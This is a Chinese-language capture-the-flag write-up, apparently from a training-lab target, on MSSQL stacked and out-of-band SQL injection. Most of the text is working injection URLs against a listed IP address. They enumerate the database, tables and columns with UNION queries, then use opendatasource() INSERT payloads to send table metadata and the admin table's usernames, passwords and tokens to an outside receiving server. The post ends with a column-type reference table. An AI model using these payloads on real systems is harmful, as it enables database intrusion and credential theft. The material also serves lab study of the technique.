---
date: "2020-12-18T00:00:00Z"
description: MSSQL 反弹注入 堆叠注入 与 MSSQL速查
keywords: SQL注入, MSSQL, 堆叠注入, OOB 带外
tags:
- SQL注入
- MSSQL
title: MSSQL 反弹注入 堆叠注入 与 MSSQL速查
---

# MSSQL 反弹注入 堆叠注入 与 MSSQL速查

> https://hack.zkaq.cn/battle/target?id=7dd07600c96f5d55

## 蠢到爆了

+ 数据库自带库，表信息也可以使用 **反弹** 方式获取
+ 数据库自带库，表信息也可以使用 **反弹** 方式获取
+ 数据库自带库，表信息也可以使用 **反弹** 方式获取
+ 数据库自带库，表信息也可以使用 **反弹** 方式获取
+ 数据库自带库，表信息也可以使用 **反弹** 方式获取
+ 数据库自带库，表信息也可以使用 **反弹** 方式获取

## 总结

### 0. 利用条件

1. 函数 `opendatasource()` 可用
2. 数据库能能对外访问 **公网** 或其他**接受服务器**。
3. sql支持 **堆叠注入** 。

### 1. OOB 反弹数据创建数据表的相关信息

```sql
-- 查看库下的表信息
create table table_temp( id int, name VARCHAR(255) )
-- oob 带外
SELECT * from table_temp;


-- 查看表下的列信息
create table column_temp (
    tableid int,    -- 表 id
    colid int,  -- 列 id
    name varchar(255),  -- 列名
    xtype int,  -- 列类型
    length int ) -- 列长度
SELECT * from column_temp;


-- 查看表下的数据信息
create table value_temp (username varchar(255), passwd char(255) , token char(255))
SELECT * from value_temp

```

### 2. 字段类型

1. `char` 和 `varchar` 是不同的。 前者会补全所有长度， 后者不会。
	+ 坑: passwd 为 `char(255)`， 导致 select 时导致屏幕没有 token 显示， 认为反弹失败。
2. 根据 `syscolumns` 中的列信息，构建接受表。

3. syscolumns表内的xtype

查了一下,这些东西都是存于每一个数据库的syscolumns表里面得,name就是列名,xtype就是数据类型,但是这个xtype是数字的,下面是数字和数据类型对应的关系;

```
 xtype=34 'image' 
 xtype= 35 'text' 
 xtype=36 'uniqueidentifier' 
 xtype=48 'tinyint' 
 xtype=52 'smallint' 
 xtype=56 'int' 
 xtype=58 'smalldatetime' 
 xtype=59 'real' 
 xtype=60 'money' 
 xtype=61 'datetime' 
 xtype=62 'float' 
 xtype=98 'sql_variant' 
 xtype=99 'ntext' 
 xtype=104 'bit' 
 xtype=106 'decimal' 
 xtype=108 'numeric' 
 xtype=122 'smallmoney' 
 xtype=127 'bigint' 
 xtype=165 'varbinary' 
 xtype=167 'varchar'

 xtype=173 'binary' 
 xtype=175 'char' 
 xtype=189 'timestamp' 
 xtype=231 'nvarchar'

 xtype=239 'nchar' 
 xtype=241 'xml' 
 xtype=231 'sysname'
 
 ```



## 0xGG 参考文档

+ [查询 current database](https://www.cnblogs.com/zhangpengshou/archive/2008/11/16/1334372.html)
+ [mssql column type 速查一览](https://blog.csdn.net/zengcong2013/article/details/68059746)
+ [mssql ms 官方文档](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysobjects-transact-sql?view=sql-server-ver15)
+ [mssql ms 官方文档 - 函数](https://docs.microsoft.com/en-us/sql/t-sql/functions/count-transact-sql?view=sql-server-ver15)



## 反弹注入

### 创建本地反弹信息收集表

```sql
create table table_temp( id int, name VARCHAR(255) )
```

### 1. 反弹表信息

```
http://59.63.200.79:8015/?id=1'; insert into opendatasource('sqloledb','server=SQL5095.example.net,1433;uid=DatabaseName_admin;pwd=DatabasePassword;database=DatabaseName').DatabaseName.dbo.table_temp select id,name from sysobjects where xtype='U' -- gg

```

![](https://nc0.cdn.zkaq.cn/md/8461/845423a1e76c3217a616eea60e51d10d_99574.png)

获取到所有用户表信息

### 反弹列信息

根据 admin 表信息，反弹其所有列信息。

```sql
create table column_temp (tableid int, colid int, name varchar(255), xtype int )
```

```bash
http://59.63.200.79:8015/?id=1'; insert into opendatasource('sqloledb','server=SQL5095.example.net,1433;uid=DatabaseName_admin;pwd=DatabasePassword;database=DatabaseName').DatabaseName.dbo.column_temp select id,colid,name,xtype from syscolumns where id=1977058079 -- gg
```

![](https://nc0.cdn.zkaq.cn/md/8461/cd729b8a20d78b88a55a2a14221ce010_16848.png)


### 反弹字段信息

根据列 `xtype` 信息， 创建数据表。

此处 id 一般为自增ID，在创建时可以忽略，避免插入时主键冲突。

```sql
create table value_temp (username varchar(255), passwd char(255) , token char(255))

```

** GET FLAG**
![](https://nc0.cdn.zkaq.cn/md/8461/54c6b3613e478f09d4847cd579817d80_24812.png)

done


# 以下为手工注入， 忽略


## 信息收集

1. **收集对象信息，方便查询文档**

```bash
http://59.63.200.79:8015/?id=1%27%20and%201=2%20union%20select%201,2,@@version%20--%20gg

# result: 	Microsoft SQL Server 2000 - 8.00.194 (Intel X86) Aug 6 2000 00:57:48 Copyright (c) 1988-2000 Microsoft Corporation Enterprise Edition on Windows NT 6.1 (Build 7601: Service Pack 1)
```

## 判断注入点

```
http://59.63.200.79:8015/?id=1' order by 3  -- g
http://59.63.200.79:8015/?id=1' order by 4  -- g 
```

3 正确，4 错误。 有三个字段

## 判断是否 `堆叠注入`

**查询数据库 1 **

```
http://59.63.200.79:8015/?id=1%27%20and%201=2%20union%20select%20*%20from%20ggadmin32%20--%20g
```

![](https://nc0.cdn.zkaq.cn/md/8461/8cb2de677d2192c6ddb571e72ee9aa21_93454.png)

**创建数据库**

```sql
create table ggadmin2 (id int, username varchar(100), password varchar(100)) ;
```

```
http://59.63.200.79:8015/?id=1' ;  create table ggadmin32 (id int, username varchar(100), password varchar(100)) -- gg
```

此时并未报错， 并且正常返回。

**查询数据库2**

```
http://59.63.200.79:8015/?id=1%27%20and%201=2%20union%20select%20*%20from%20ggadmin32%20--%20g
```


![](https://nc0.cdn.zkaq.cn/md/8461/ae3e237a9b7ca1a0cd7010b3b2fdc88b_54253.png)

可以看到，并未报错，并且出现了空数据，这里并未查询到任何数据是因为我们新建表里没有任何数据。

> 当前 漏洞 支持堆叠注入。

## 漏洞利用 

### 查询数据库信息

```bash
## 查询数据库ID
http://59.63.200.79:8015/?id=1' and 1=2 union select 1,2,(Select Dbid From Master..SysProcesses Where Spid = @@spid) from sysobjects -- gg
## result : 7 

##  查询数据库名
http://59.63.200.79:8015/?id=1' and 1=2 union select 1,2,(Select Name From Master..SysDataBases Where DbId=(Select Dbid From Master..SysProcesses Where Spid = @@spid)) from sysobjects -- gg
## result : sql
```

### 查询表信息

```bash
## 查询 第一条表 信息
http://59.63.200.79:8015/?id=1' and 1=2 union select 1,( SELECT top 1 name from sysobjects where xtype='U' ),( SELECT top 1 id from sysobjects where xtype='U'  ) from sysobjects -- gg
## result :  news, 437576597 
```

**使用子查询模拟 limit**

```sql
select top 1 id,name from sysobjects where xtype='U' and id not in (
	select top 3 id from sysobjects where xtype='U' 
)
```

**查询第N条表信息**

```bash
http://59.63.200.79:8015/?id=1' and 1=2 union select 1,2,( select top 1 id from sysobjects where xtype='U' and id not in (	select top 3 id from sysobjects where xtype='U' ) ) from sysobjects -- gg

## result: admin, 1977058079
```

**查询列数量**

```sql
select count(*) from syscolumns where id=1977058079
```
```bash
http://59.63.200.79:8015/?id=1' and 1=2 union select 1,2,( select count(*) from syscolumns where id=1977058079 ) from syscolumns -- gg

## result: 4 
```

**查询表信息**

```sql
SELECT top 1 CONCAT(name,'__',colid,'__',xtype) from syscolumns where id=1977058079
-- ms sql 2000 不支持 concat 函数， 2019 支持，其他未确认。
```

**查询表名**

```bash
http://59.63.200.79:8015/?id=1' and 1=2 union select 1,2,( SELECT top 1 name from syscolumns where id=1977058079  and name not in ( 'password','id','passwd','token') ) from syscolumns -- gg

## result: id, password,token,passwd

```

**查询表 xtype**

```bash
## 查询表名
http://59.63.200.79:8015/?id=1' and 1=2 union select 1,2,( SELECT top 1 xtype from syscolumns where id=1977058079  and name not in ('id','passwd','token')  ) from syscolumns -- gg

# id => 56                      -> int 
# passwd => 175             -> char 
# token => 175               -> char 
# username  => 167        -> varchar 
```

### 本地创建表

```sql
create table admin999 (id int, username varchar(255),passwd char(255),token char(255)) ;
```

![](https://nc0.cdn.zkaq.cn/md/8461/7bb5da8dbc10d265ffc64ee9ddfd37b9_65644.png)

### 反弹数据

```
http://59.63.200.79:8015/?id=1'; insert into opendatasource('sqloledb','server=SQL5095.example.net,1433;uid=DatabaseName_admin;pwd=DatabasePassword;database=DatabaseName').DatabaseName.dbo.admin999 select id,username,password,token from admin -- gg
```

![](https://nc0.cdn.zkaq.cn/md/8461/e623be3cc70d7e5b3755c1ccef67e97b_13880.png)
